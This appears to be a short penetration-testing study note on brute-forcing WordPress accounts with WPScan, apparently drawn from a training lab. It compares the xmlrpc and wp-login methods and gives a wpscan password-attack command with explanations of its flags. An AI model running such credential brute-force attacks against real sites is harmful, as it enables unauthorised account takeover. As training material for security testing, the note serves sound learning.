---
title: Attacking WordPress Users
updated: 2023-07-21T21:10:16.0000000+01:00
created: 2023-07-20T20:25:59.0000000+01:00
date modified: Monday, May 13th 2024, 11:05:02 pm
---

WordPress User Brute Force:

WPScan can be used to brute force usernames and passwords. We can see that **admin, roger** and **David.** We can use two methods of brute forcing - **xmlrpc** and **wp-login.** The **wp-login** method will attempt to brute force the normal WordPress login. The **xmlrpc** method uses the WordPress API to make login attempts through **/xmlrpc.php**

The **xmlrpc** method is preferred as it is faster.

wpscan --password-attack xmlrpc -t 20-U admin, david -P passwords.txt --url <http://blog.inlanefreight.com>
![image1](../../../../_resources/image1-132.png)

**Key:**

- --password-attack
  - *Refers to the method of attack*
- -t
  - *Defines max threads to be used.*
- -U
  - *Defines the two users we want to search*
- -P
  - *Defines our password list.*

